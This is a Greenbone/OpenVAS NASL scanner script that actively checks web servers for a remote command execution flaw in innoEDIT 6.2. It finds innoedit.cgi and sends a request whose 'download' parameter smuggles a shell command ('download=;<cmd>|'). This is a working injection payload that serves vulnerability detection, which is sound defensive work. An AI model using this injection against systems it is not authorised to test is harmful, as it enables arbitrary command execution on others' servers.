# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103927");
  script_version("2026-03-27T15:50:34+0000");
  script_tag(name:"last_modification", value:"2026-03-27 15:50:34 +0000 (Fri, 27 Mar 2026)");
  script_tag(name:"creation_date", value:"2014-03-24 11:13:42 +0100 (Mon, 24 Mar 2014)");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("innoEDIT 6.2 RCE Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"innoEDIT is prone to a remote code execution (RCE)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"Successful exploits will allow remote attackers to execute
  arbitrary commands within the context of the application.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"affected", value:"innoEDIT version 6.2 and probably others.");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/125823/innoEDIT-6.2-Remote-Command-Execution.html");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port( default:80 );

cmds = exploit_commands();

foreach dir( make_list_unique( "/innoedit", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" )
    dir = "";

  res = http_get_cache( port:port, item:dir + "/innoedit.cgi" );

  if( ! res || res !~ "^HTTP/1\.[01] 200" )
    continue;

  foreach cmd( keys( cmds ) ) {
    url = dir + "/innoedit.cgi?download=;" + cmds[cmd] + "|";

    if( http_vuln_check( port:port, url:url, pattern:cmd ) ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
